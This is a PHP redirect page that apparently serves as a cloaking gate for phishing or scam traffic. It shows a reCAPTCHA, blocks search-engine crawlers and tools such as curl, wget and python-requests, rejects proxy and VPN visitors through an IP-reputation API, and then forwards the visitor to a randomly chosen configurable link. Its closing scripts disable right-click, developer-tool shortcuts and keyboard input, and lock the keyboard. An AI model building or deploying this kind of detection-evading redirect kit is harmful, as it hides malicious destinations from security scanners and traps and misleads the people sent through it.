<?php 
include 'includes/wp-code.php'; 
include 'setup/setting.php';
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

$ip_address = $_SERVER['REMOTE_ADDR']; 

function displayCaptchaForm($initial = false) {
    global $site_key;
    echo '<div id="recaptcha-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); z-index: 1000;">';
    echo '<form id="recaptcha-form" method="POST" style="background: white; padding: 20px; border-radius: 10px; text-align: center;">';
    echo '<div class="g-recaptcha" data-sitekey="' . htmlspecialchars($site_key, ENT_QUOTES, 'UTF-8') . '" data-callback="onReCaptchaSuccess"></div>';
    echo '<br>';
    if ($initial) {
        echo '<input type="hidden" name="initial_captcha" value="true">';
    }
    echo '<input type="submit" value="Submit" style="display: none;">';
    echo '</form>';
    echo '</div>';
    echo '<script src="https://www.google.com/recaptcha/api.js" async defer></script>';
    echo '<script>
        function onReCaptchaSuccess() {
            document.getElementById("recaptcha-form").submit();
        }
    </script>';
    exit;
}

if ($g_recaptcha && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $recaptcha_response = $_POST['g-recaptcha-response'] ?? '';
    $response = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=" . urlencode($secret_key) . "&response=" . urlencode($recaptcha_response));

    if ($response === false) {
        error_log("Failed to verify CAPTCHA.");
        die("CAPTCHA verification failed. Please try again.");
    }

    $response_keys = json_decode($response, true);

    if (intval($response_keys["success"]) !== 1) {
        die("CAPTCHA verification failed. Please try again.");
    }
}

if ($g_recaptcha && $_SERVER['REQUEST_METHOD'] !== 'POST') {
    displayCaptchaForm();
} 

if ($bots) {
    $blocked_user_agents = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver', 'MJ12bot',
        'AhrefsBot', 'DotBot', 'SeznamBot', 'megaindex', 'BLEXBot', 'SearchmetricsBot',
        'SemrushBot', 'rogerbot', 'Mediapartners-Google', 'spbot', 'Crawl', 'Spider',
        'bot', 'curl', 'wget', 'python-requests', 'libwww-perl', 'PHP', 'Go-http-client'
    ];

    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    foreach ($blocked_user_agents as $agent) {
        if (stripos($user_agent, $agent) !== false) {
            die("Bots are not allowed.");
        }
    }

    if (!empty($_POST['hidden_field'])) {
        die("Bots are not allowed.");
    }
}

if ($IsProxyIP) {
    function get_isproxyip_info($ip, $IsProxyIP_API) {
        $url = "https://isproxyip.com/api/v1/{$ip}?api_key=" . urlencode($IsProxyIP_API);
        $context = stream_context_create(['http' => ['ignore_errors' => true]]);
        $response = @file_get_contents($url, false, $context);
        if ($response === false || strpos($http_response_header[0], "200") === false) {
            error_log("IsProxyIP API request failed or API key is incorrect.");
            return null;
        }
        return json_decode($response, true);
    }

    function is_proxy_or_vpn_isproxyip($ip_info) {
        return isset($ip_info['proxy']) && $ip_info['proxy'] === true;
    }

    $isproxyip_info = get_isproxyip_info($ip_address, $IsProxyIP_API);
    if ($isproxyip_info === null) {
        error_log("IsProxyIP response is null.");
        die("IsProxyIP API request failed or API key is incorrect.");
    } elseif (is_proxy_or_vpn_isproxyip($isproxyip_info)) {
        die("Proxy or VPN detected via IsProxyIP.");
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 400;
        }
        .title-text {
            font-weight: 900;
        }
    </style>
</head>
<body>
<?php if($organic) { ?>
<center><img src="<?php echo $image; ?>" style="max-height: 500px;width: auto;"></center>
<br><center><p id="countdown"></p></center>
<br>
<center><b><?php echo $text2; ?><br></b></center>
  <script type="text/javascript">
    var links = [
      "<?php echo $link1; ?>",
      "<?php echo $link2; ?>",
      "<?php echo $link3; ?>",
      "<?php echo $link4; ?>",
      "<?php echo $link5; ?>",
      "<?php echo $link6; ?>",
      "<?php echo $link7; ?>",
      "<?php echo $link8; ?>",
      "<?php echo $link9; ?>",
      "<?php echo $link10; ?>"
    ];

    var randomIndex = Math.floor(Math.random() * links.length);
    var randomLink = links[randomIndex];
    var timer = <?php echo $timer; ?>; 
    var text = "<?php echo $text1; ?>";
    var countdownElement = document.getElementById("countdown");
    var countdownInterval = setInterval(function() {
      if (timer > 0) {
        countdownElement.innerHTML = text.replace("{timer}", timer);
        timer--;
      } else {
        clearInterval(countdownInterval);
        window.location.href = randomLink;
      }
    }, 1000);
  </script>
<?php } else { ?>
<script type="text/javascript">
  var links = [
    "<?php echo $link1; ?>",
    "<?php echo $link2; ?>",
    "<?php echo $link3; ?>",
    "<?php echo $link4; ?>",
    "<?php echo $link5; ?>",
    "<?php echo $link6; ?>",
    "<?php echo $link7; ?>",
    "<?php echo $link8; ?>",
    "<?php echo $link9; ?>",
    "<?php echo $link10; ?>"
  ];

  var randomIndex = Math.floor(Math.random() * links.length);
  var randomLink = links[randomIndex];
  window.location.href = randomLink;
</script>
<?php } ?>
<script>
   document.addEventListener('contextmenu', event => event.preventDefault());
   document.onkeydown = function (e) {
   if(e.keyCode == 16) {return false;}
   if(e.keyCode == 17) {return false;}
   if(e.keyCode == 18) {return false;}
   if(e.keyCode == 123) {return false;}
   if(e.ctrlKey && e.shiftKey && e.keyCode == 73){return false;}
   if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {return false;}
   if(e.ctrlKey && e.shiftKey && e.keyCode == 67) {return false;}
   if(e.ctrlKey && e.keyCode == 85) {return false;}
   }
</script>
<script>
        window.onload = function() {
            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
            }, false);

            function disabledEvent(e) {
                if (e.stopPropagation) {
                    e.stopPropagation();
                } else if (window.event) {
                    window.event.cancelBubble = true;
                }
                e.preventDefault();
                return false;
            }
        };
        document.onkeydown = function(e) {
            return false;
        }
        navigator.keyboard.lock();
    </script>
</body>
</html>
